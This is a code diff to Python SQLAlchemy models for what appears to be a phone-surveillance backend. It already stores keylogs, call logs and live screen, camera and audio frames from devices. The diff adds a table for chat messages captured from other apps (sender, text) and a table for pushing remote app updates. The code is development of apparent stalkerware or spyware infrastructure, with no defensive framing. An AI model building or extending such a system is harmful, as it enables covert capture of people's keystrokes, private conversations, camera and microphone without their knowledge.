@@ -20,6 +20,7 @@ class User(Base):
     installed_apps = relationship("InstalledApp", back_populates="owner")
     notifications = relationship("Notification", back_populates="owner")
     keylogs = relationship("Keylog", back_populates="owner")
+    chat_messages = relationship("ChatMessage", back_populates="owner")
 
 class Device(Base):
     __tablename__ = "devices"
@@ -42,6 +43,7 @@ class Device(Base):
     installed_apps = relationship("InstalledApp", back_populates="device")
     notifications = relationship("Notification", back_populates="device")
     keylogs = relationship("Keylog", back_populates="device")
+    chat_messages = relationship("ChatMessage", back_populates="device")
 
 class CallLog(Base):
     __tablename__ = "call_logs"
@@ -194,6 +196,20 @@ class Keylog(Base):
     owner = relationship("User", back_populates="keylogs")
     device = relationship("Device", back_populates="keylogs")
 
+class ChatMessage(Base):
+    __tablename__ = "chat_messages"
+    id = Column(Integer, primary_key=True, index=True)
+    package_name = Column(String, index=True)
+    app_name = Column(String)
+    sender = Column(String)
+    text = Column(String)
+    timestamp = Column(BigInteger)
+    device_id = Column(Integer, ForeignKey("devices.id"))
+    owner_id = Column(Integer, ForeignKey("users.id"))
+
+    owner = relationship("User", back_populates="chat_messages")
+    device = relationship("Device", back_populates="chat_messages")
+
 class LiveScreenFrame(Base):
     __tablename__ = "live_screen_frames"
 
@@ -211,6 +227,16 @@ class LiveCameraFrame(Base):
     frame_data = Column(LargeBinary)
     timestamp = Column(BigInteger)
     device = relationship("Device")
+
+class AppUpdate(Base):
+    __tablename__ = "app_updates"
+    id = Column(Integer, primary_key=True, index=True)
+    version_name = Column(String)
+    version_code = Column(Integer, unique=True)
+    s3_key = Column(String)
+    file_size = Column(Integer, default=0)
+    created_at = Column(DateTime(timezone=True), default=func.now())
+    uploaded_by = Column(Integer, ForeignKey("users.id"))
 
 class LiveAudioFrame(Base):
     __tablename__ = "live_audio_frames"
